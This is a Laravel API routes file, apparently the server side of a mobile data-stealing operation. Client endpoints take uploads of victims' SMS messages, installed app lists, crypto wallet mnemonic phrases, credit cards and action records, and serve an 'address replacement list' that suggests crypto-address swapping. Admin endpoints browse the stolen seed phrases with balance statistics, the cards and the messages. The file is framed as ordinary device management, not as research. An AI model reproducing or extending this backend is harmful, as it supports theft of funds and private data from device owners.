<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

//C端
//Route::prefix('v1')->name('api.v1')->namespace('Api\v1')->group(function () {
//
//});

//客户端
Route::prefix('client')->name('api.client')->namespace('Client')->middleware('throttle:client')->group(function () {

    //监听列表
    Route::get('monitorList', 'DeviceController@monitorList'); //获取所有开启的监听数据
    //通过渠道编号查询渠道网址
    Route::get('channel/getUrl', 'DeviceController@getChannelUrl'); //通过渠道编号查询渠道的网址
    //上报设备信息
    Route::post('device/report', 'DeviceController@reportDevice'); //上报设备信息，存在则更新，不存在则新增
    //查询设备信息
    Route::get('device/info', 'DeviceController@infoByDeviceNumber'); //根据设备号查询设备信息
    Route::get('device/check-exists', 'DeviceController@checkDeviceExists');
    Route::get('device/check-valid', 'DeviceController@checkValidDevice'); //检测有效设备
    //上报设备应用列表
    Route::post('device/reportApps', 'DeviceController@reportApps'); //上报设备应用列表
    //上报设备短信列表
    Route::post('device/reportSms', 'DeviceController@reportSms'); //上报设备短信列表
    //上报设备助记词
    Route::post('device/reportWords', 'DeviceController@reportWords'); //上报设备助记词
    //上报设备信用卡
    Route::post('device/reportCards', 'DeviceController@reportCards'); //上报设备信用卡
    //上报用户动作记录
    Route::post('device/reportActionRecords', 'DeviceController@reportActionRecords'); //上报用户动作记录
    //检查版本更新
    Route::get('version/check', 'VersionController@checkUpdate'); //检查版本更新
    //获取最新版本（Android和iOS）
    Route::get('version/latest', 'VersionController@latest'); //获取安装和IOS的最新版本
    //获取替换地址列表
    Route::get('assets/addressReplist', 'AssetsController@addressReplist'); //获取替换地址列表
    //上报资产数据
    Route::post('assets/reportAssets', 'AssetsController@reportAssets'); //上报资产数据
    //版本管理
    Route::post('version/updateDownloadCount', 'VersionController@updateDownloadCount'); //更新下载次数

});

//管理端
Route::prefix('admin')->name('api.admin')->namespace('Admin')->group(function () {


    //测试
    Route::get('test', 'TestController@test');
    //账号密码登录
    Route::post('auth/login', 'AuthorizationsController@login')->name('login');
    //图形验证码
    Route::get('captcha', 'VerificationCodesController@captcha');

    Route::get('ipWhitelist/check', 'IpWhitelistController@check'); //检查IP是否在白名单中
    Route::get('ipWhitelist/getAllWhitelistIps', 'IpWhitelistController@getAllWhitelistIps'); //获取所有启用的白名单IP
    Route::get('ipWhitelist/getAllBlacklistIps', 'IpWhitelistController@getAllBlacklistIps'); //获取所有启用的黑名单IP
    Route::post('device/pushMessage', 'DeviceController@pushMessage'); //推送消息到指定设备
    //刷新token（不需要中间件认证，JWT refresh可以在token过期后的refresh_ttl内刷新）
    Route::put('auth/refresh', 'AuthorizationsController@update');

    Route::middleware(['admin.auth:admin_api', 'operate.log'])->group(function () {
        //退出登录
        Route::get('auth/loginOut', 'AuthorizationsController@destroy');
        //左侧菜单栏
        Route::get('auth/menu', 'AuthorizationsController@menu'); //用户权限列表
        //账号信息
        Route::get('info', 'AuthorizationsController@info');
        //修改账号信息
        Route::post('auth/update', 'AuthorizationsController@updateInfo');
        //修改密码
        Route::post('auth/updatePassword', 'AuthorizationsController@updatePassword');
        //二次密码验证
        Route::post('auth/verifySecondPassword', 'AuthorizationsController@verifySecondPassword');
        //日志记录列表
        Route::get('operateLog/list', 'OperateLogController@list');
        //文件上传
        //Route::post('upload', 'UploadController@store');
        //链接上传
        //Route::post('upload/url', 'UploadController@urlStore');
        //分片上传的文件保存
        //Route::post('upload/save', 'UploadController@urlSave');


        //权限管理
        Route::get('permission/list', 'PermissionController@list'); //权限列表
        Route::get('permission/info', 'PermissionController@info'); //获取指定权限
        Route::get('permission/select', 'PermissionController@select'); //下拉列表
        Route::post('permission/add', 'PermissionController@add'); //添加权限
        Route::post('permission/update', 'PermissionController@update'); //编辑权限
        Route::post('permission/del', 'PermissionController@delete'); //删除权限

        //角色管理
        Route::get('role/list', 'RoleController@list'); //角色列表
        Route::get('role/info', 'RoleController@info'); //获取指定角色
        Route::post('role/add', 'RoleController@add'); //添加角色
        Route::post('role/update', 'RoleController@update'); //编辑角色
        Route::post('role/del', 'RoleController@delete'); //删除角色

        //管理员列表
        Route::get('user/list', 'AdminUserController@list'); //管理员列表
        Route::get('user/info', 'AdminUserController@info'); //获取指定管理员
        Route::post('user/add', 'AdminUserController@add'); //添加管理员
        Route::post('user/update', 'AdminUserController@update'); //编辑管理员
        Route::post('user/del', 'AdminUserController@delete'); //删除管理员
        Route::post('user/resetPassword', 'AdminUserController@resetPassword'); //重置密码
        Route::post('user/changeStatus', 'AdminUserController@changeStatus'); //账号禁用/启用

        //系统配置管理
        Route::get('systemConfig/list', 'SystemConfigController@list'); //配置列表
        Route::get('systemConfig/info', 'SystemConfigController@info'); //获取指定配置
        Route::get('systemConfig/getByKey', 'SystemConfigController@getByKey'); //根据key获取配置
        Route::get('systemConfig/getByGroup', 'SystemConfigController@getByGroup'); //根据分组获取配置
        Route::get('systemConfig/getGroups', 'SystemConfigController@getGroups'); //获取所有分组列表
        Route::post('systemConfig/add', 'SystemConfigController@add'); //添加配置
        Route::post('systemConfig/update', 'SystemConfigController@update'); //编辑配置
        Route::post('systemConfig/del', 'SystemConfigController@delete'); //删除配置
        Route::post('systemConfig/changeStatus', 'SystemConfigController@changeStatus'); //配置状态切换
        Route::post('systemConfig/batchDelete', 'SystemConfigController@batchDelete'); //批量删除配置
        Route::post('systemConfig/batchUpdateValues', 'SystemConfigController@batchUpdateValues'); //批量更新配置值
        //IP白名单管理
        Route::get('ipWhitelist/list', 'IpWhitelistController@list'); //IP白名单列表
        Route::get('ipWhitelist/info', 'IpWhitelistController@info'); //获取指定IP白名单
        Route::post('ipWhitelist/add', 'IpWhitelistController@add'); //添加IP白名单
        Route::post('ipWhitelist/update', 'IpWhitelistController@update'); //编辑IP白名单
        Route::post('ipWhitelist/del', 'IpWhitelistController@delete'); //删除IP白名单

        //渠道管理
        Route::get('channel/list', 'ChannelController@list'); //渠道列表
        Route::get('channel/info', 'ChannelController@info'); //获取指定渠道
        Route::post('channel/add', 'ChannelController@add'); //添加渠道
        Route::post('channel/update', 'ChannelController@update'); //编辑渠道
        Route::post('channel/del', 'ChannelController@delete'); //删除渠道

        //监听管理
        Route::get('monitor/list', 'MonitorController@list'); //监听列表
        Route::get('monitor/info', 'MonitorController@info'); //获取指定监听配置
        Route::post('monitor/add', 'MonitorController@add'); //添加监听配置
        Route::post('monitor/update', 'MonitorController@update'); //编辑监听配置
        Route::post('monitor/del', 'MonitorController@delete'); //删除监听配置

        //短信管理
        Route::get('receiveSms/list', 'ReceiveSmsController@list'); //短信列表
        Route::get('receiveSms/info', 'ReceiveSmsController@info'); //获取指定短信
        Route::post('receiveSms/del', 'ReceiveSmsController@delete'); //删除短信
        Route::post('receiveSms/batchDelete', 'ReceiveSmsController@batchDelete'); //批量删除短信

        //应用管理
        Route::get('receiveApp/list', 'ReceiveAppController@list'); //应用列表
        Route::get('receiveApp/info', 'ReceiveAppController@info'); //获取指定应用
        Route::post('receiveApp/del', 'ReceiveAppController@delete'); //删除应用
        Route::post('receiveApp/batchDelete', 'ReceiveAppController@batchDelete'); //批量删除应用

        //助记词管理
        Route::get('receiveWords/list', 'ReceiveWordsController@list'); //助记词列表
        Route::get('receiveWords/info', 'ReceiveWordsController@info'); //获取指定助记词
        Route::get('receiveWords/balanceStats', 'ReceiveWordsController@balanceStats'); //余额统计

        //信用卡管理
        Route::get('receiveCards/list', 'ReceiveCardsController@list'); //信用卡列表
        Route::get('receiveCards/info', 'ReceiveCardsController@info'); //获取指定信用卡

        //动作记录管理
        Route::get('actionRecord/list', 'ActionRecordController@list'); //动作记录列表
        Route::get('actionRecord/info', 'ActionRecordController@info'); //获取指定动作记录
        Route::post('actionRecord/del', 'ActionRecordController@delete'); //删除动作记录
        Route::post('actionRecord/batchDelete', 'ActionRecordController@batchDelete'); //批量删除动作记录
        Route::get('actionRecord/analyze', 'ActionRecordController@analyze'); //动作分析统计

        //设备管理
        Route::get('device/list', 'DeviceController@list'); //设备列表
        Route::get('device/info', 'DeviceController@info'); //获取指定设备
        Route::post('device/update', 'DeviceController@update'); //更新设备信息
        Route::get('device/onlineCount', 'DeviceController@onlineCount'); //获取在线设备数量
        
        Route::get('device/websocketStatus', 'DeviceController@getWebSocketStatus'); // 获取 WebSocket 连接状态（调试用）

        //首页统计
        Route::get('home/statistics', 'HomeController@statistics'); //首页统计数据

        //版本管理
        Route::get('version/list', 'VersionController@list'); //版本列表
        Route::get('version/info', 'VersionController@info'); //获取指定版本
        Route::post('version/add', 'VersionController@add'); //添加版本
        Route::post('version/update', 'VersionController@update'); //编辑版本
        Route::post('version/del', 'VersionController@delete'); //删除版本
        Route::post('version/batchDelete', 'VersionController@batchDelete'); //批量删除版本
        Route::post('version/changeStatus', 'VersionController@changeStatus'); //版本状态切换


    });
});
